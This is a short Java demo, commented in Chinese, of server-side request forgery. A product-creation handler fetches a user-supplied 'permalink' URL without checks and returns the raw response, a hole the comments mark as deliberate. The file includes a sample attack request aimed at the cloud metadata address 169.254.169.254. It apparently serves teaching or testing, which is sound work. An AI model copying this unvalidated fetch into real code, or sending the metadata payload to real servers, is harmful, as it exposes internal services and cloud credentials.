package com.crm.example;

import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.function.Function;

import static java.util.Objects.requireNonNull;

public class SsrfVulnerableApp {
    public static void main(String[] args) {
        // 模拟商品创建接口
        Function<String, String> createProductHandler = (requestJson) -> {
            try {
                // 模拟解析JSON参数（实际应使用JSON库）
                String permalink = requestJson.split("\\"permalink\\"")[1].split("\\"")[1];
                
                // 漏洞点：直接使用用户输入构造URI
                URI uri = URI.create(permalink);
                HttpClient client = HttpClient.newHttpClient();
                
                // 构造并发送请求
                HttpRequest productRequest = HttpRequest.newBuilder()
                    .uri(uri)
                    .header("Content-Type", "application/json")
                    .build();
                
                // 同步发送请求并获取响应
                HttpResponse<String> response = client.send(productRequest, HttpResponse.BodyHandlers.ofString());
                
                // 返回原始响应内容（暴露内部数据）
                return String.format("{\\"status\\":\\"success\\",\\"data\\":%s}", response.body());
            } catch (Exception e) {
                return String.format("{\\"status\\":\\"error\\",\\"message\\":\\"%s\\"}", e.getMessage());
            }
        };

        // 模拟攻击请求
        String maliciousRequest = "{\\"name\\":\\"Evil Product\\",\\"permalink\\":\\"http://169.254.169.254/latest/meta-data/\\"}";
        String response = createProductHandler.apply(maliciousRequest);
        System.out.println(response);
    }
}

/*
编译运行：
1. javac --add-modules jdk.incubator.httpclient SsrfVulnerableApp.java
2. java --add-modules jdk.incubator.httpclient com.crm.example.SsrfVulnerableApp
*/